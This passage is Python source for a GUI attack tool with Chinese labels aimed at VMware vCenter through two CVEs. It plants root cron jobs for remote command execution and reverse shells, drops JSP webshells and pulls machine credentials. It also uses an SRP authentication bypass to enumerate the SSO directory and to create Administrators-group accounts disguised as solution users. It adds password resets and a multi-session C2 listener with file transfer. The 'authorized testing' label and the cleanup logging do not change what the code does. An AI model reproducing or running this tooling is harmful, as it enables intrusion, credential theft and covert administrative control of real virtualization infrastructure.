            self.record("59310-写入验证", host, path, "rm -f %s" % path)
        self.run_bg(work, "写入验证")

    def _b310_preview(self):
        dest = self.v510_wpath.get().strip()
        content = self.v510_wtext.get("1.0", "end").strip()
        vec = self.v510_vec.get()
        app = traversal_app(dest) if vec == "app" else "probe"
        hostn = "h" if vec == "app" else traversal_host(dest)
        pkt = build_rfc5424(hostn, app, "\n" + content + "\n#")
        self.log("[预览] %r" % pkt, "d")
        messagebox.showinfo("报文预览", pkt.decode("latin-1", "replace"))

    def _b310_write(self):
        host, port, tcp, tls = self._510_net()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        dest = self.v510_wpath.get().strip()
        content = self.v510_wtext.get("1.0", "end").strip()

        def work():
            vec = "app" if self.v510_vec.get().startswith("APP") else "host"
            written, pkt = write_file(host, port, dest, content, vector=vec,
                                      tcp=tcp, tls=tls)
            self.log("[+] 已发送写入 → 预期文件 %s" % written, "+")
            self.log("[d] %r" % pkt, "d")
            self.record("59310-任意写", host, written, "rm -f %s" % written)
        self.run_bg(work, "任意写")

    def _b310_rce_readback(self):
        host, port, tcp, tls = self._510_net()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        cmd = self.v510_cmd.get()
        if "\n" in cmd:
            messagebox.showwarning("提示", "命令不能包含换行")
            return
        tag = rand_name(6)
        try:
            vport = int(self.v510_vport.get() or 5480)
        except ValueError:
            messagebox.showwarning("提示", "VAMI 端口需为数字")
            return
        self.stop_flag.clear()
        proxy = self.http_proxy.get().strip() or None

        def work():
            self.log("[*] RCE(回显) → %s : %s" % (host, cmd), "i")
            ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
                                    vami_port=vport, proxy=proxy,
                                    use_b64=self.v510_b64.get(),
                                    poll_cb=lambda s: self.log(s, "m"),
                                    stop_flag=self.stop_flag)
            if ok:
                self.log("[+] 命令输出已取回（%d 字节）" % len(text), "+")

                def _show(text=text):
                    self.v510_out.delete("1.0", "end")
                    self.v510_out.insert("1.0", text)
                self.root.after(0, _show)
                self.record("59310-RCE", host, cmd[:80],
                            "rm -f /opt/vmware/share/htdocs/r%s.txt "
                            "/etc/cron.d/cve59310%s*" % (tag, tag))
            else:
                self.log("[!] %s" % text, "!")
        self.run_bg(work, "RCE回显")

    def _b310_rce_plain(self):
        host, port, tcp, tls = self._510_net()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        cmd = self.v510_cmd.get()
        if "\n" in cmd:
            messagebox.showwarning("提示", "命令不能包含换行")
            return
        name = self.v510_name.get().strip() or rand_name()
        out = "/tmp/cve59310_%s.txt" % name

        def work():
            if self.v510_b64.get():
                b64 = base64.b64encode(cmd.encode()).decode()
                body = "/bin/sh -c 'echo %s | base64 -d | /bin/sh > %s 2>&1'" % (b64, out)
            else:
                body = "/bin/sh -c '{ %s; } > %s 2>&1'" % (
                    cmd.replace("'", "'\\''"), out)
            planted, _ = plant_cron(host, port, body, name, tcp=tcp, tls=tls)
            self.log("[+] 已植入 %s（crond 约 60s 内以 root 执行）" % planted, "+")
            self.log("[i] 目标上读取: cat %s" % out, "m")
            self.record("59310-RCE落盘", host, out,
                        "rm -f %s /etc/cron.d/cve59310%s*" % (out, name))
        self.run_bg(work, "RCE落盘")

    def _b310_revshell(self):
        host, port, tcp, tls = self._510_net()
        lhost = self.v510_lhost.get().strip()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        if not lhost:
            import socket as _s
            try:
                _t = _s.socket(_s.AF_INET, _s.SOCK_DGRAM)
                _t.connect((host, 514))
                lhost = _t.getsockname()[0]
                _t.close()
                self.v510_lhost.set(lhost)
                self.log("[i] LHost 自动探测: %s" % lhost, "m")
            except OSError:
                messagebox.showwarning("提示", "需要 LHost（自动探测失败，请手填）")
                return
        try:
            lport = int(self.v510_lport.get() or 4444)
        except ValueError:
            messagebox.showwarning("提示", "LPort 需为数字")
            return
        method = self.v510_rmethod.get()

        def work():
            planted, _ = plant_revshell(host, port, lhost, lport, method,
                                        tcp=tcp, tls=tls)
            self.log("[+] 已植入反弹 %s:%d → %s" % (lhost, lport, planted), "+")
            self.record("59310-反弹植入", host, "%s:%d" % (lhost, lport),
                        "rm -f /etc/cron.d/cve59310*-syslog.log")
            self.root.after(0, lambda: self.shell_port.set(str(lport)))
            self.root.after(0, lambda: self._c2_add_listener(lport))
            self.root.after(0, lambda: self.nb.select(self.tab_shell))
            self.log("[i] 已切换到 ④ 页并请求监听 %d；crond 约 60s 触发回连" % lport, "m")
        self.run_bg(work, "反弹植入")

    def _b310_webshell(self):
        host, port, tcp, tls = self._510_net()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        name = self.v510_wsname.get().strip() or rand_name()

        def work():
            written, planted, urls = drop_webshell(host, port, name, tcp=tcp, tls=tls)
            self.log("[+] ① 写入 %s" % written, "+")
            self.log("[+] ② cron 落地 %s" % planted, "+")
            for u in urls:
                self.log("[+] 访问: %s" % u, "+")
            self.log("[i] 等待 crond 执行后生效；statsreport 可能要求认证", "m")
            self.record("59310-WebShell", host, urls[0],
                        "rm -f /usr/lib/vmware-perfcharts/tc-instance/webapps/"
                        "statsreport/%s.jsp /usr/lib/vmware-perfcharts/webapps/"
                        "statsreport/%s.jsp /tmp/ws%s-syslog.log" % (name, name, name))
        self.run_bg(work, "WebShell")

    def _b310_quick_forensics(self):
        """一键取证：RCE 依次执行 系统信息 → 机器账户 → SSO 域名，输出回显。"""
        host, port, tcp, tls = self._510_net()
        if not host:
            messagebox.showwarning("提示", "请检查目标与端口设置")
            return
        try:
            vport = int(self.v510_vport.get() or 5480)
        except ValueError:
            messagebox.showwarning("提示", "VAMI 端口需为数字")
            return
        proxy = self.http_proxy.get().strip() or None
        self.stop_flag.clear()

        def work():
            for key in ("sysinfo", "machine-creds", "sso-domain"):
                name, cmd = POSTEX_ACTIONS[key]
                self.log("[*] 一键取证[%s] → %s" % (name, host), "i")
                tag = rand_name(6)
                ok, text = rce_readback(host, port, cmd, tag, tcp=tcp, tls=tls,
                                        vami_port=vport, proxy=proxy,
                                        poll_cb=lambda s: self.log(s, "m"),
                                        stop_flag=self.stop_flag)
                if not ok:
                    self.log("[!] %s：%s" % (name, text), "!")
                    return
                self.log("[+] %s：\n%s" % (name, text), "+")
                self.record("59310-一键取证", host, name,
                            "rm -f /opt/vmware/share/htdocs/r%s.txt "
                            "/etc/cron.d/cve59310%s*" % (tag, tag))
            self.log("[+] 一键取证完成", "+")
        self.run_bg(work, "一键取证")

    # ================= Tab3 CVE-2026-59309 =================
    def _build_tab_59309(self):
        f = self.tab_59309
        f.columnconfigure(0, weight=1)
        f.columnconfigure(1, weight=1)
        f.rowconfigure(1, weight=1)
        _bar, tv = self._target_bar(f)
        self.v590_host = tv

        left = ttk.Frame(f)
        left.grid(row=1, column=0, sticky="nsew", padx=(0, 6))
        right = ttk.Frame(f)
        right.grid(row=1, column=1, sticky="nsew", padx=(6, 0))

        pf = ttk.LabelFrame(left, text="参数")
        pf.pack(fill="x", pady=4)
        self.v590_port = tk.StringVar(value="389")
        self.v590_tls = tk.BooleanVar(value=False)
        self.v590_policy = tk.StringVar(value="auto")
        ttk.Label(pf, text="端口:").grid(row=0, column=0, padx=4)
        _port_cb = ttk.Combobox(pf, textvariable=self.v590_port,
                                values=["389", "636", "2020"], width=6,
                                state="readonly")
        _port_cb.grid(row=0, column=1)
        _port_cb.bind("<<ComboboxSelected>>",
                      lambda e: self.v590_tls.set(self.v590_port.get() == "636"))
        ttk.Checkbutton(pf, text="TLS (LDAPS)",
                        variable=self.v590_tls).grid(row=0, column=2, columnspan=2)
        ttk.Label(pf, text="安全层:").grid(row=0, column=4, padx=(10, 2))
        ttk.Combobox(pf, textvariable=self.v590_policy, values=["auto", "full", "plain"],
                     width=6, state="readonly").grid(row=0, column=5, sticky="w")
        ttk.Label(pf, text="身份(须存在):").grid(row=1, column=0, padx=4, pady=2)
        self.v590_ident = tk.StringVar(value="administrator@vsphere.local")
        ttk.Entry(pf, textvariable=self.v590_ident).grid(row=1, column=1, columnspan=5,
                                                         sticky="ew")

        bf = ttk.LabelFrame(left, text="探测与绕过")
        bf.pack(fill="x", pady=4)
        ttk.Button(bf, text="SRP 机制探测（匿名 rootDSE）[F3]",
                   command=self._b309_probe).pack(fill="x", padx=4, pady=2)
        ttk.Button(bf, text="执行认证绕过（A=N → 伪造 M1）",
                   style="Acc.TButton",
                   command=self._b309_bypass).pack(fill="x", padx=4, pady=2)
        ttk.Button(bf, text="一键评估（探测 → 绕过 → 枚举用户/管理员组）",
                   command=self._b309_quick_assess).pack(fill="x", padx=4, pady=2)
        self.v590_info = tk.Text(left, height=6, bg=COLORS["logbg"], fg=COLORS["fg"],
                                 relief="flat", font=(self.font_family, 9))
        self.v590_info.pack(fill="x", pady=4)

        lf = ttk.LabelFrame(left, text="SSO 目录信息收集")
        lf.pack(fill="both", expand=True, pady=4)
        ttk.Button(lf, text="枚举用户 (cn=Users)",
                   command=self._b309_users).pack(fill="x", padx=4, pady=2)
        ttk.Button(lf, text="查看管理员组成员",
                   command=self._b309_admins).pack(fill="x", padx=4, pady=2)
        wrapf = ttk.Frame(lf)
        wrapf.pack(fill="both", expand=True, padx=4, pady=2)
        self.v590_tree = ttk.Treeview(wrapf, columns=("attrs",), show="tree headings")
        self.v590_tree.heading("#0", text="DN")
        self.v590_tree.heading("attrs", text="关键属性")
        self.v590_tree.column("#0", width=280)
        self.v590_tree.column("attrs", width=240)
        sy = ttk.Scrollbar(wrapf, orient="vertical", command=self.v590_tree.yview)
        sx = ttk.Scrollbar(wrapf, orient="horizontal", command=self.v590_tree.xview)
        self.v590_tree.pack(side="left", fill="both", expand=True)
        sy.pack(side="left", fill="y")
        sx.pack(side="bottom", fill="x")
        self.v590_tree.configure(yscrollcommand=sy.set, xscrollcommand=sx.set)
        self._tree_resizable(self.v590_tree)
        self.v590_tree.bind("<Button-3>", self._v590_menu)

        af = ttk.LabelFrame(right, text="账户操作（授权测试）")
        af.pack(fill="x", pady=4)
        af.columnconfigure(1, weight=1)
        ttk.Label(af, text="新管理员").grid(row=0, column=0, padx=4, sticky="w")
        self.v590_newuser = tk.StringVar(value=stealth_user())
        ttk.Entry(af, textvariable=self.v590_newuser, width=13).grid(
            row=0, column=1, sticky="ew")
        ttk.Label(af, text="密码").grid(row=0, column=2, padx=4)
        self.v590_newpass = tk.StringVar(value=rand_name(12))
        ttk.Entry(af, textvariable=self.v590_newpass, width=11).grid(row=0, column=3)
        ttk.Button(af, text="↻", width=3,
                   command=self._b309_randacct).grid(row=0, column=4)
        ttk.Label(af, text="命名伪装为 vCenter 解决方案用户").grid(
            row=0, column=5, padx=(6, 0), sticky="w")
        ttk.Button(af, text="创建 SSO 管理员（加入 Administrators）",
                   style="Acc.TButton",
                   command=self._b309_addadmin).grid(row=1, column=0, columnspan=5,
                                                     sticky="we", padx=4, pady=4)
        ttk.Label(af, text="重置 DN").grid(row=2, column=0, padx=4, sticky="w")
        self.v590_rstuser = tk.StringVar(
            value="cn=administrator,cn=Users,dc=vsphere,dc=local")
        ttk.Entry(af, textvariable=self.v590_rstuser, width=24).grid(
            row=2, column=1, columnspan=2, sticky="ew", padx=2)
        ttk.Label(af, text="新密码").grid(row=2, column=3, padx=(6, 2))
        self.v590_rstpass = tk.StringVar(value=rand_name(12))
        ttk.Entry(af, textvariable=self.v590_rstpass, width=14).grid(
            row=2, column=4, padx=(0, 4))
        ttk.Button(af, text="重置该账户密码（ldapmodify replace）",
                   style="Danger.TButton", command=self._b309_resetpw).grid(
            row=3, column=0, columnspan=5, sticky="we", padx=4, pady=4)
        ttk.Label(af, text="删除 DN").grid(row=4, column=0, padx=4, sticky="w")
        self.v590_delentry = tk.StringVar()
        ttk.Entry(af, textvariable=self.v590_delentry, width=24).grid(
            row=4, column=1, columnspan=3, sticky="ew", padx=2)
        ttk.Button(af, text="删除该 DN（ldapdelete）", style="Danger.TButton",
                   command=self._b309_delete).grid(
            row=5, column=0, columnspan=5, sticky="we", padx=4, pady=(2, 4))

        nf = ttk.LabelFrame(right, text="说明")
        nf.pack(fill="x", pady=4)
        self._wrap_lbl(nf, "原理：libsrp 未校验 A ≡ 0 (mod N)。发送 A=N ⇒ S=0 ⇒ "
                           "K=SHA1(\"\") 已知，伪造 M1 通过 SASL bind，以任意“存在”"
                           "的身份读写 SSO 目录。若返回 “Illegal value for 'A' "
                           "(A mod N == 0)” ⇒ 目标已修复。")

        cf = ttk.LabelFrame(right, text="LDAP 查询控制台")
        cf.pack(fill="both", expand=True, pady=4)
        ttk.Label(cf, text="Base:").grid(row=0, column=0, padx=4, sticky="w")
        self.v590_cbase = tk.StringVar()
        ttk.Entry(cf, textvariable=self.v590_cbase).grid(row=0, column=1, columnspan=3,
                                                         sticky="ew")
        ttk.Label(cf, text="范围:").grid(row=1, column=0, padx=4, sticky="w")
        self.v590_cscope = tk.StringVar(value="sub")
        ttk.Combobox(cf, textvariable=self.v590_cscope, values=["base", "one", "sub"],
                     width=5, state="readonly").grid(row=1, column=1, sticky="w")
        ttk.Label(cf, text="过滤器:").grid(row=2, column=0, padx=4, sticky="w")
        self.v590_cfilter = tk.StringVar(value="(objectClass=*)")
        ttk.Entry(cf, textvariable=self.v590_cfilter).grid(row=2, column=1, columnspan=3,
                                                           sticky="ew")
        ttk.Button(cf, text="查询", style="Acc.TButton",
                   command=self._b309_console).grid(row=3, column=0, sticky="w",
                                                    padx=4, pady=4)
        self.v590_ctext = tk.Text(cf, height=8, bg=COLORS["logbg"], fg=COLORS["fg"],
                                  relief="flat", font=(self.font_family, 9))
        self.v590_ctext.grid(row=4, column=0, columnspan=4, sticky="nsew", padx=4, pady=2)
        cf.columnconfigure(1, weight=1)
        cf.rowconfigure(4, weight=1)

    def _b309_randacct(self):
        self.v590_newuser.set(stealth_user())
        self.v590_newpass.set(gen_password())

    def _309_net(self):
        host = self.v590_host.get().strip().split(":")[0]
        port = int(self.v590_port.get())
        return host, port, self.v590_tls.get() or port == 636

    def _b309_probe(self):
        host, port, tls = self._309_net()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return

        def work():
            self.log("[*] rootDSE 探测 %s:%d …" % (host, port), "i")
            dse = root_dse_probe(host, port, tls, 8)
            mechs, ncs = dse["mechs"], dse["namingContexts"]

            def _show(mechs=mechs, ncs=ncs):
                self.log("[+] SASL 机制: %s" % (",".join(mechs) or "(无)"), "+")
                self.log("[+] namingContexts: %s" % (";".join(ncs) or "(无)"), "+")
                if has_srp(mechs):
                    self.log("[+] 通告 SRP 机制 → CVE-2026-59309 攻击面暴露", "+")
                else:
                    self.log("[!] 未通告 SRP 机制（可能已修复/禁用，或需认证读 rootDSE）",
                             "!")
                self.root.after(0, lambda ncs=ncs: self.v590_cbase.set(ncs[0]))
            self.root.after(0, _show)
        self.run_bg(work, "SRP探测")

    def _b309_bypass(self):
        host, port, tls = self._309_net()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        ident = self.v590_ident.get().strip()
        policy = self.v590_policy.get()

        def work():
            self.log("[*] CVE-2026-59309 认证绕过 → %s:%d 身份=%s 策略=%s" %
                     (host, port, ident, policy), "i")
            try:
                conn = connect_ldap(host, port, tls, 8)
            except Exception as e:
                self.log("[!] 连接失败: %r" % e, "!")
                return
            r = srp_bypass_bind(conn, ident, policy, log=self.log)
            if not r.ok:
                self.log("[!] %s" % r.msg, "!")
                conn.close()
                return
            self.log("[+] %s" % r.msg, "+")
            info = r.info
            text = ("身份: %s\nN: %d bit\n服务端选项: %s\n"
                    "客户端选项: %s\n安全层: %s" %
                    (info["identity"], info["N_bits"],
                     info["server_options"], info["client_options"],
                     info["layer"]))

            def _show(text=text):
                self.v590_info.delete("1.0", "end")
                self.v590_info.insert("1.0", text)
            self.root.after(0, _show)
            try:
                conn.send_op(op_search("", scope=0, attrs=["namingContexts"]))
                entries, _ = collect_search(conn)
                ncs = []
                for _dn, at in entries:
                    ncs += at.get("namingContexts", [])
                self.log("[+] 以 %s 身份读取 namingContexts: %s" % (ident, ";".join(ncs)), "+")
                if ncs and not self.v590_cbase.get():
                    self.v590_cbase.set(ncs[0])
            except Exception as e:
                self.log("[!] 后续查询失败: %r" % e, "!")
            self.srp_conns[host] = conn
            self.record("59309-认证绕过", host, ident,
                        "（认证类动作无需远端清理；创建的账户见单独记录）")
        self.run_bg(work, "认证绕过")

    def _309_conn(self):
        """返回 (conn, host)；未绕过时返回 (None, host) 并提示。"""
        host = self.v590_host.get().strip().split(":")[0]
        conn = self.srp_conns.get(host)
        if conn is None:
            self.log("[!] 请先在该目标上执行“认证绕过”", "!")
            return None, host
        return conn, host

    def _309_fill_tree(self, entries):
        self.v590_tree.delete(*self.v590_tree.get_children())
        for dn, at in entries:
            keys = ("cn", "sAMAccountName", "userPrincipalName", "member", "objectClass")
            s = " | ".join("%s=%s" % (k, ",".join(at[k][:3])) for k in keys if at.get(k))
            self.v590_tree.insert("", "end", text=dn, values=(s[:220],))

    def _b309_users(self):
        def work():
            conn, _host = self._309_conn()
            if conn is None:
                return
            base = self.v590_cbase.get().strip()
            if not base:
                self.log("[!] Base DN 为空（先执行绕过或探测）", "!")
                return
            conn.send_op(op_search("cn=Users," + base, scope=2,
                                   ffilter="(objectClass=person)",
                                   attrs=["cn", "sAMAccountName", "userPrincipalName"]))
            entries, code = collect_search(conn)
            self.log("[+] 枚举到 %d 个用户对象 (code=%s)" % (len(entries), code), "+")
            self.root.after(0, lambda: self._309_fill_tree(entries))
        self.run_bg(work, "枚举用户")

    def _b309_admins(self):
        def work():
            conn, _host = self._309_conn()
            if conn is None:
                return
            base = self.v590_cbase.get().strip()
            if not base:
                self.log("[!] Base DN 为空（先执行绕过或探测）", "!")
                return
            conn.send_op(op_search("cn=Administrators,cn=Builtin," + base, scope=0,
                                   ffilter="(objectClass=*)",
                                   attrs=["member", "cn", "description"]))
            entries, _c = collect_search(conn)
            n = 0
            for _dn, at in entries:
                for m in at.get("member", []):
                    self.log("[admin] %s" % m, "+")
                    n += 1
            self.root.after(0, lambda: self._309_fill_tree(entries))
            self.log("[+] 管理员组读取完成（%d 成员）" % n, "+")
        self.run_bg(work, "管理员组")

    def _b309_addadmin(self):
        import re as _re

        def work():
            conn, host = self._309_conn()
            if conn is None:
                return
            base = self.v590_cbase.get().strip()
            if not base:
                self.log("[!] Base DN 为空（先执行绕过或探测）", "!")
                return
            user = self.v590_newuser.get().strip()
            pw = self.v590_newpass.get()
            if not _re.fullmatch(r"[A-Za-z0-9_.-]{3,32}", user):
                raise ValueError("用户名仅允许字母数字._-，3-32 位")
            dom = base.replace("dc=", "").replace(",", ".").replace(" ", "")
            udn = "cn=%s,cn=Users,%s" % (user, base)
            upn = "%s@%s" % (user, dom)
            conn.send_op(op_add(udn, [
                ("objectClass", ["top", "person", "organizationalPerson", "user"]),
                ("cn", [user]), ("sn", [dom]), ("givenName", [user]),
                ("sAMAccountName", [user]), ("userPrincipalName", [upn]),
                ("uid", [user]), ("userPassword", [pw]),
            ]))
            _i, _t, val = conn.recv_op()
            code, diag = parse_ldap_result(val)
            if code != 0:
                self.log("[!] 创建用户失败 code=%s %s" %
                         (code, diag.decode("utf-8", "replace")), "!")
                return
            self.log("[+] 用户已创建: %s（UPN %s）" % (udn, upn), "+")
            conn.send_op(op_modify("cn=Administrators,cn=Builtin," + base,
                                   [(0, "member", [udn])]))
            _i, _t, val = conn.recv_op()
            code, diag = parse_ldap_result(val)
            if code != 0:
                self.log("[!] 加入管理员组失败 code=%s %s" %
                         (code, diag.decode("utf-8", "replace")), "!")
            else:
                self.log("[+] %s 已加入 SSO Administrators" % user, "+")
                self.log("[i] 登录: https://%s/ui  用户 %s / %s" % (host, upn, pw), "+")
            self.record("59309-创建管理员", host, udn, "（清理）ldapdelete：%s" % udn)
            self._add_cred("SSO新增账户@%s" % host, "%s / %s" % (upn, pw))
        self.run_bg(work, "创建管理员")

    def _b309_delete(self):
        dn = self.v590_delentry.get().strip()
        if not dn:
            messagebox.showwarning("提示", "输入要删除的账户 DN")
            return
        if not messagebox.askyesno("二次确认", "将从 SSO 目录删除：\n%s\n继续？" % dn):
            return

        def work():
            conn, host = self._309_conn()
            if conn is None:
                return
            conn.send_op(op_delete(dn))
            _i, _t, val = conn.recv_op()
            code, diag = parse_ldap_result(val)
            if code == 0:
                self.log("[+] 已删除: %s" % dn, "+")
                self.record("59309-删除账户", host, dn, "（已删除）")
            else:
                self.log("[!] 删除失败 code=%s %s" %
                         (code, diag.decode("utf-8", "replace")), "!")
        self.run_bg(work, "删除账户")

    def _b309_resetpw(self):
        def work():
            conn, host = self._309_conn()
            if conn is None:
                return
            dn = self.v590_rstuser.get().strip()
            pw = self.v590_rstpass.get()
            conn.send_op(op_modify(dn, [(2, "userPassword", [pw])]))
            _i, _t, val = conn.recv_op()
            code, diag = parse_ldap_result(val)
            if code == 0:
                self.log("[+] 密码已重置: %s" % dn, "+")
                self._add_cred("SSO重置@%s:%s" % (host, dn), pw)
                self.record("59309-重置密码", host, dn, "（请自行恢复原密码）")
            else:
                self.log("[!] 重置失败 code=%s %s" %
                         (code, diag.decode("utf-8", "replace")), "!")
        self.run_bg(work, "重置密码")

    def _b309_console(self):
        def work():
            conn, _host = self._309_conn()
            if conn is None:
                return
            base = self.v590_cbase.get().strip()
            if not base:
                self.log("[!] Base DN 为空（先执行绕过或探测）", "!")
                return
            scope = {"base": 0, "one": 1, "sub": 2}[self.v590_cscope.get()]
            filt = self.v590_cfilter.get().strip() or "(objectClass=*)"
            conn.send_op(op_search(base, scope=scope, ffilter=filt, attrs=["*"]))
            entries, code = collect_search(conn)
            lines = []
            for dn, at in entries[:400]:
                lines.append("DN: " + dn)
                for k in sorted(at):
                    lines.append("  %s: %s" % (k, "; ".join(at[k][:5])))
            text = "\n".join(lines) or "(空结果)"

            def _show(text=text):
                self.v590_ctext.delete("1.0", "end")
                self.v590_ctext.insert("1.0", text)
            self.root.after(0, _show)
            self.log("[+] 查询完成: %d 条 (code=%s)" % (len(entries), code), "+")
        self.run_bg(work, "LDAP查询")

    def _b309_quick_assess(self):
        """一键评估：SRP 探测 → 认证绕过 → 枚举用户 → 管理员组，一气呵成。"""
        host, port, tls = self._309_net()
        if not host:
            messagebox.showwarning("提示", "需要目标")
            return
        ident = self.v590_ident.get().strip()
        policy = self.v590_policy.get()

        def work():
            self.log("[*] 一键评估 → %s:%d" % (host, port), "i")
            try:
                dse = root_dse_probe(host, port, tls, 8)
            except Exception as e:
                self.log("[!] 探测失败: %r" % e, "!")
                return
            self.log("[+] SASL 机制: %s" % (",".join(dse["mechs"]) or "(无)"), "+")
            if not has_srp(dse["mechs"]):
                self.log("[!] 未通告 SRP 机制，中止（可能已修复/禁用）", "!")
                return
            base = dse["namingContexts"][0] if dse["namingContexts"] else \
                "dc=vsphere,dc=local"
            self.root.after(0, lambda b=base: self.v590_cbase.set(b))
            try:
                conn = connect_ldap(host, port, tls, 8)
            except Exception as e:
                self.log("[!] 连接失败: %r" % e, "!")
                return
            r = srp_bypass_bind(conn, ident, policy, log=self.log)
            if not r.ok:
                self.log("[!] 绕过失败: %s" % r.msg, "!")
                conn.close()
                return
            self.log("[+] %s" % r.msg, "+")
            for label, dn, scope, ff, keys in (
                    ("枚举用户", "cn=Users," + base, 2, "(objectClass=person)",
                     ("userPrincipalName",)),
                    ("管理员组", "cn=Administrators,cn=Builtin," + base, 0,
                     "(objectClass=*)", ("member",))):
                try:
                    conn.send_op(op_search(dn, scope=scope, ffilter=ff, attrs=list(keys)))
                    entries, _code = collect_search(conn)
                    self.log("[+] %s: %d 条" % (label, len(entries)), "+")
                    for _dn, at in entries:
                        for k in keys:
                            for v in at.get(k, []):
                                self.log("  [%s] %s" % (label, v), "m")
                except Exception as e:
                    self.log("[!] %s 失败: %r" % (label, e), "!")
            self.srp_conns[host] = conn
            self.record("59309-一键评估", host, ident, "（认证类动作无需远端清理）")
            self.log("[+] 一键评估完成；可在本页继续账户操作或 LDAP 查询", "+")
        self.run_bg(work, "一键评估")

    # ================= Tab4 C2 / 反弹 Shell =================
    def _build_tab_shell(self):
        f = self.tab_shell
        f.columnconfigure(0, weight=3)
        f.columnconfigure(1, weight=2)
        f.rowconfigure(1, weight=1)

        left = ttk.Frame(f)
        left.grid(row=0, rowspan=2, column=0, sticky="nsew", padx=(0, 6))
        right = ttk.Frame(f)
        right.grid(row=0, rowspan=2, column=1, sticky="nsew")

        lf = ttk.LabelFrame(left, text="监听与会话（多会话 C2）")
        lf.pack(fill="both", expand=True, pady=4)
        lbar = ttk.Frame(lf)
        lbar.pack(fill="x", padx=4, pady=2)
        ttk.Label(lbar, text="端口:").pack(side="left")
        self.shell_port = tk.StringVar(value="4444")
        ttk.Entry(lbar, textvariable=self.shell_port, width=8).pack(side="left", padx=4)
        ttk.Button(lbar, text="启动监听 [F4]", style="Acc.TButton",
                   command=self._c2_add_listener_ui).pack(side="left")
        ttk.Button(lbar, text="探测存活", command=self._c2_probe).pack(side="left", padx=6)
        ttk.Button(lbar, text="关闭选中会话", style="Danger.TButton",
                   command=self._c2_close).pack(side="left")
        self._wrap_lbl(lf, "流程：② 页植入反弹 → 本页启动监听 → 回连后双击会话行交互。"
                           "植入为一次性 cron（回连后自毁，不会每分钟重复回连）；"
                           "断线后需重新植入。本工具不做隐蔽持久化。")
        wrapf = ttk.Frame(lf)
        wrapf.pack(fill="both", expand=True, padx=4, pady=2)
        self.sess_tree = ttk.Treeview(wrapf, columns=("addr", "created", "state"),
                                      show="tree headings")
        self.sess_tree.heading("#0", text="ID")
        self.sess_tree.heading("addr", text="来源")
        self.sess_tree.heading("created", text="创建")
        self.sess_tree.heading("state", text="状态")
        self.sess_tree.column("#0", width=50)
        self.sess_tree.column("addr", width=170)
        self.sess_tree.column("created", width=80)
        self.sess_tree.column("state", width=70)
        sb = ttk.Scrollbar(wrapf, command=self.sess_tree.yview)
        self.sess_tree.pack(side="left", fill="both", expand=True)
        sb.pack(side="left", fill="y")
        self.sess_tree.configure(yscrollcommand=sb.set)
        self._tree_resizable(self.sess_tree)
        self.sess_tree.bind("<Button-3>", self._sess_menu)
        self.sess_tree.bind("<Double-1>", lambda e: self._c2_use())

        rf = ttk.LabelFrame(right, text="交互终端（选中会话后直通）")
        rf.pack(fill="both", expand=True, pady=4)
        self.term = tk.Text(rf, height=8, bg=COLORS["term"], fg=COLORS["termfg"],
                            insertbackground=COLORS["termfg"], relief="flat",
                            font=("Consolas", 10))
        self.term.insert("1.0", "[i] 选中会话后此处接管交互（原始 shell）。\n"
                                "[i] 当前暂无会话：先在 ② 页植入反弹并启动监听，\n"
                                "    回连成功后会话会出现在左侧列表，双击即可接管。\n")
        self.term.pack(fill="both", expand=True, padx=4, pady=4)
        cmdbar = ttk.Frame(rf)
        cmdbar.pack(fill="x", padx=4, pady=4)
        ttk.Label(cmdbar, text="shell>", style="Muted.TLabel").pack(side="left")
        self.shell_cmd = tk.StringVar()
        e = ttk.Entry(cmdbar, textvariable=self.shell_cmd)
        e.pack(side="left", fill="x", expand=True, padx=6)
        e.bind("<Return>", lambda _e: self._shell_send())
        ttk.Button(cmdbar, text="发送", command=self._shell_send).pack(side="left")

        ff = ttk.LabelFrame(right, text="文件传输（经当前会话）")
        ff.pack(fill="x", pady=4)
        fbar = ttk.Frame(ff)
        fbar.pack(fill="x", padx=4, pady=2)
        ttk.Label(fbar, text="本地:").pack(side="left")
        self.up_local = tk.StringVar()
        ttk.Entry(fbar, textvariable=self.up_local, width=16).pack(
            side="left", fill="x", expand=True, padx=2)
        ttk.Label(fbar, text="远端:").pack(side="left")
        self.up_remote = tk.StringVar(value="/tmp/uploaded")
        ttk.Entry(fbar, textvariable=self.up_remote, width=14).pack(side="left", padx=2)
        ttk.Button(fbar, text="上传", command=self._c2_upload).pack(side="left", padx=2)
        ttk.Button(fbar, text="下载", command=self._c2_download).pack(side="left")

    def _c2_add_listener_ui(self):
        try:
            port = int(self.shell_port.get() or 4444)
        except ValueError:
            messagebox.showwarning("提示", "端口无效")
            return
        self._c2_add_listener(port)

    def _c2_add_listener(self, port):
        def work():
            try:
                self.c2m.add_listener(port)
            except OSError as e:
                self.log("[!] 无法监听 %d: %s" % (port, e), "!")
        self.run_bg(work, "监听")

    def _poll_term(self):
        """实时流：当前会话的原始输出直接上屏（ANSI 颜色码已剥离）。"""
        try:
            s = self.cur_sess or self._c2_selected()
            if s and not s.feed_paused:
                out = s.take_output()
                if out:
                    self.term.configure(state="normal")
                    self.term.insert("end", out)
                    self.term.see("end")
        except Exception:
            pass
        self.root.after(200, self._poll_term)

    def _on_new_session(self, sess):
        # 新会话自动接管：切 ④、置当前会话（表由 _poll_sessions 刷新）
        s_id, s_addr = sess.id, sess.addr

        def go():
            self.nb.select(self.tab_shell)
            self.cur_sess = sess
            self._term_append("== 已自动接管会话 #%d (%s) ==" % (s_id, s_addr))
            self.log("[i] 已自动接管会话 #%d（%s）" % (s_id, s_addr), "m")
        self.root.after(0, go)

    def _poll_sessions(self):
        try:
            have = {int(i) for i in self.sess_tree.get_children()}
            now = {}
            for s in self.c2m.list_sessions():
                now[s.id] = s
                if s.id in have:
                    continue
                self.sess_tree.insert("", "end", iid=str(s.id), text="#%d" % s.id,
                                      values=(s.addr, s.created,
                                              "存活" if s.alive else "已断开"))
            for i in have - set(now):
                self.sess_tree.delete(str(i))
            for i, s in now.items():
                if self.sess_tree.exists(str(i)):
                    self.sess_tree.item(str(i), values=(
                        s.addr, s.created, "存活" if s.alive else "已断开"))
        except Exception:
            pass
        self.root.after(1000, self._poll_sessions)

    def _c2_selected(self):
        sel = self.sess_tree.selection()
        if not sel:
            return None
        return self.c2m.get(int(sel[0]))

    def _c2_use(self):
        s = self._c2_selected()
